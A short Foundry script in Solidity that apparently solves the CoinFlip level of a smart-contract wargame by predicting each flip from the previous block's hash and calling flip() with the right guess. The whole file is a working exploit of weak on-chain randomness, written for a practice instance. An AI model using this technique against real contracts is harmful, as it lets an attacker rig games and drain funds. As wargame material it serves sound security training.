// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "instances/level03.sol";

contract AttackerCoinFlipScript is Script {
    CoinFlip level03 = CoinFlip(vm.envAddress("INSTANCE"));

    function run() external {
        vm.startBroadcast();

        uint256 blockNum = block.number;
        uint256 blockValue = uint256(blockhash(blockNum - 1));

        level03.flip(blockValue >> 255 == 1);

        console.log("blockNum", blockNum);
        console.log("Consecutive Wins: ", level03.consecutiveWins());

        vm.stopBroadcast();
    }
}
